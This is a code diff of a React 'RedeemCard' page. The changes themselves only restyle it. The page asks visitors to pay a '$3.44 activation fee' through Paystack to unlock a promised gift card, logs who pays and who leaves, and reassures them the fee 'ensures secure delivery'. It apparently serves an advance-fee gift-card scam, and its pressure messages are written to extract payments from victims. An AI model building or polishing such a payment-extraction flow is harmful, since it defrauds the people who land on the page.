@@ -25,7 +25,7 @@ const RedeemCard = () => {
     const [paymentFailed, setPaymentFailed] = useState(false);
     const [toastMessage, setToastMessage] = useState('');
 
-    // Load Paystack Inline JS script and set light theme
+    // Load Paystack Inline JS script
     useEffect(() => {
         logActivity('A user visited the Clearance Page', 'info');
         const script = document.createElement('script');
@@ -33,16 +33,8 @@ const RedeemCard = () => {
         script.async = true;
         document.body.appendChild(script);
 
-        // Force light theme on this specific page
-        document.body.style.backgroundColor = '#f3f4f6';
-        document.body.style.backgroundImage = 'none';
-        document.body.style.color = '#111827';
-
         return () => {
             document.body.removeChild(script);
-            document.body.style.backgroundColor = '';
-            document.body.style.backgroundImage = '';
-            document.body.style.color = '';
         };
     }, []);
 
@@ -101,14 +93,12 @@ const RedeemCard = () => {
                 email: userEmail,
                 amount: Math.round(convertedAmountGhs * 100), // GHS 51.60 in pesewas (5160 pesewas)
                 currency: 'GHS',
-                channels: ['card'], // Restrict strictly to credit/debit card payments
+                channels: ['card'],
                 callback: function (response) {
-                    // Payment successful
                     logActivity(`User successfully paid the $3.44 activation fee for ${cardData?.brandName} card!`, 'success');
                     triggerCardRevealAnimation();
                 },
                 onClose: function () {
-                    // Stop and tell the user the payment was unsuccessful
                     logActivity(`User closed the payment modal without paying the activation fee.`, 'warning');
                     setPaymentFailed(true);
                 }
@@ -119,33 +109,20 @@ const RedeemCard = () => {
         }
     };
 
-    // Copy to clipboard helper
     const copyToClipboard = (text) => {
         navigator.clipboard.writeText(text);
         setToastMessage('Details copied successfully!');
         setTimeout(() => setToastMessage(''), 2000);
     };
 
-    const lightContentStyle = {
-        background: '#ffffff',
-        border: '1px solid #e5e7eb',
-        borderRadius: '16px',
-        padding: '36px',
-        boxShadow: '0 10px 25px -5px rgba(0,0,0,0.05), 0 8px 10px -6px rgba(0,0,0,0.01)',
-        color: '#1f2937',
-        animation: 'slideUpFade 0.6s ease'
-    };
-
-    const textMuted = { color: '#6b7280' };
-
     if (error) {
         return (
             <div className="container">
-                <div style={{...lightContentStyle, textAlign: 'center', borderTop: '4px solid #ef4444'}}>
+                <div className="content" style={{ textAlign: 'center', borderTop: '4px solid #ef4444' }}>
                     <div style={{ fontSize: '48px', marginBottom: '16px' }}>⚠️</div>
-                    <h1 style={{ color: '#111827', WebkitTextFillColor: 'initial', background: 'none' }}>Link Expired or Invalid</h1>
-                    <p style={textMuted}>{error}</p>
-                    <button onClick={() => navigate('/')} className="btn" style={{ marginTop: '12px', background: '#2563eb' }}>
+                    <h1>Link Expired or Invalid</h1>
+                    <p>{error}</p>
+                    <button onClick={() => navigate('/')} className="btn" style={{ marginTop: '12px' }}>
                         Return Home
                     </button>
                 </div>
@@ -156,13 +133,13 @@ const RedeemCard = () => {
     if (paymentFailed) {
         return (
             <div className="container animate-fadeIn">
-                <div style={{...lightContentStyle, textAlign: 'center', borderTop: '4px solid #ef4444'}}>
+                <div className="content" style={{ textAlign: 'center', borderTop: '4px solid #ef4444' }}>
                     <div style={{ fontSize: '48px', marginBottom: '16px' }}>❌</div>
-                    <h1 style={{ color: '#111827', WebkitTextFillColor: 'initial', background: 'none' }}>Payment Unsuccessful</h1>
-                    <p style={{ ...textMuted, marginBottom: '24px' }}>
+                    <h1>Payment Unsuccessful</h1>
+                    <p style={{ marginBottom: '24px' }}>
                         Your payment could not be processed. We need this activation fee to securely deliver your gift card.
                     </p>
-                    <button onClick={() => setPaymentFailed(false)} className="btn" style={{ width: '100%', background: '#2563eb' }}>
+                    <button onClick={() => setPaymentFailed(false)} className="btn">
                         Try Again
                     </button>
                 </div>
@@ -173,8 +150,8 @@ const RedeemCard = () => {
     if (!cardData) {
         return (
             <div className="container">
-                <div style={{...lightContentStyle, textAlign: 'center'}}>
-                    <p style={textMuted}>Loading your gift...</p>
+                <div className="content" style={{ textAlign: 'center' }}>
+                    <p>Loading your gift...</p>
                 </div>
             </div>
         );
@@ -185,17 +162,17 @@ const RedeemCard = () => {
     return (
         <div className="container">
             {!isLoading && !isPaid && (
-                <div style={lightContentStyle}>
-                    <h1 style={{ textAlign: 'center', marginBottom: '8px', color: '#111827', WebkitTextFillColor: 'initial', background: 'none' }}>
+                <div className="content">
+                    <h1 style={{ textAlign: 'center' }}>
                         {cardData?.bypassPayment ? 'Your Gift Card is Ready' : 'Card Activation Required'}
                     </h1>
                     
                     {cardData?.bypassPayment ? (
-                        <p style={{ textAlign: 'center', fontSize: '15px', color: '#4b5563', marginBottom: '24px' }}>
+                        <p style={{ textAlign: 'center' }}>
                             Great news! This gift card has been pre-activated. Click below to view your card details instantly.
                         </p>
                     ) : (
-                        <p style={{ textAlign: 'center', fontSize: '15px', color: '#4b5563', marginBottom: '24px' }}>
+                        <p style={{ textAlign: 'center' }}>
                             To access your {cardData.brandName} Gift Card, a standard activation fee of <strong>$3.44</strong> is required. This ensures secure delivery.
                         </p>
                     )}
@@ -249,11 +226,11 @@ const RedeemCard = () => {
                     )}
 
                     {cardData?.bypassPayment ? (
-                        <button onClick={triggerCardRevealAnimation} className="btn" style={{ background: '#10b981', color: '#fff', boxShadow: '0 4px 6px rgba(16,185,129,0.2)' }}>
+                        <button onClick={triggerCardRevealAnimation} className="btn" style={{ background: '#10b981' }}>
                             Access Gift Card
                         </button>
                     ) : (
-                        <button onClick={handlePaystackPayment} className="btn" style={{ background: '#2563eb', color: '#fff', boxShadow: '0 4px 6px rgba(37,99,235,0.2)' }}>
+                        <button onClick={handlePaystackPayment} className="btn">
                             Pay Activation Fee ($3.44)
                         </button>
                     )}
@@ -262,7 +239,7 @@ const RedeemCard = () => {
 
             {/* Processing Steps */}
             {isLoading && (
-                <div style={{...lightContentStyle, textAlign: 'center'}}>
+                <div className="content" style={{ textAlign: 'center' }}>
                     <div style={{ 
                         width: '40px', height: '40px', borderRadius: '50%', 
                         border: '3px solid #e5e7eb', borderTopColor: '#2563eb', 
@@ -296,28 +273,28 @@ const RedeemCard = () => {
 
             {/* Success Reveal Screen */}
             {isPaid && (
-                <div style={{...lightContentStyle, textAlign: 'center'}} className="animate-fadeIn">
+                <div className="content animate-fadeIn" style={{ textAlign: 'center' }}>
                     <div style={{ fontSize: '48px', marginBottom: '10px' }}>🎁</div>
-                    <h1 style={{ color: '#111827', WebkitTextFillColor: 'initial', background: 'none', marginBottom: '8px' }}>Here is your Gift Card!</h1>
-                    <p style={{ marginBottom: '28px', color: '#4b5563', fontSize: '15px' }}>Your payment was successful. Enjoy your gift!</p>
+                    <h1 style={{ marginBottom: '8px' }}>Here is your Gift Card!</h1>
+                    <p style={{ marginBottom: '28px' }}>Your payment was successful. Enjoy your gift!</p>
                     
-                    {/* Light Holographic Card */}
-                    <div className={`hologram-card hologram-${brandInfo.color}`} style={{ margin: '0 auto 30px auto', boxShadow: '0 20px 25px -5px rgba(0,0,0,0.1)' }}>
+                    {/* Light Flat Card */}
+                    <div className={`hologram-card hologram-${brandInfo.color}`}>
                         <div className="hologram-logo">
-                            <BrandIcon brandId={cardData.brandName} size={32} style={{ marginRight: '8px' }} color="#ffffff" />
-                            <span style={{ color: '#ffffff' }}>{cardData.brandName}</span>
+                            <BrandIcon brandId={cardData.brandName} size={32} style={{ marginRight: '8px' }} color="#111827" />
+                            <span>{cardData.brandName}</span>
                         </div>
                         
-                        <div className="hologram-details" style={{ textAlign: 'left', color: '#ffffff' }}>
+                        <div className="hologram-details" style={{ textAlign: 'left' }}>
                             <span style={{ fontSize: '9px', textTransform: 'uppercase', opacity: 0.8, letterSpacing: '1px' }}>Claim Code</span>
-                            <div className="hologram-code" style={{ textShadow: 'none' }}>{cardData.code}</div>
+                            <div className="hologram-code">{cardData.code}</div>
                             <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '11px', marginTop: '6px', opacity: 0.9 }}>
                                 <span>PIN: {cardData.pin}</span>
                                 <span>{cardData.serial}</span>
                             </div>
                         </div>
                         
-                        <div className="hologram-amount" style={{ color: '#ffffff' }}>
+                        <div className="hologram-amount">
                             ${cardData.amount}.00
                         </div>
                     </div>
@@ -325,7 +302,6 @@ const RedeemCard = () => {
                     <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                         <button 
                             className="btn" 
-                            style={{ background: '#2563eb', color: '#fff' }}
                             onClick={() => copyToClipboard(`Brand: ${cardData.brandName}\nCode: ${cardData.code}\nPIN: ${cardData.pin}\nValue: $${cardData.amount}.00`)}
                         >
                             Copy Card Details
@@ -334,7 +310,7 @@ const RedeemCard = () => {
                 </div>
             )}
 
-            {toastMessage && <div style={{ position: 'fixed', bottom: '20px', left: '50%', transform: 'translateX(-50%)', background: '#111827', color: '#fff', padding: '10px 20px', borderRadius: '50px', fontSize: '14px', boxShadow: '0 10px 15px -3px rgba(0,0,0,0.1)', animation: 'slideUpFade 0.3s ease', zIndex: 1000 }}>{toastMessage}</div>}
+            {toastMessage && <div className="toast-msg">{toastMessage}</div>}
         </div>
     );
 };
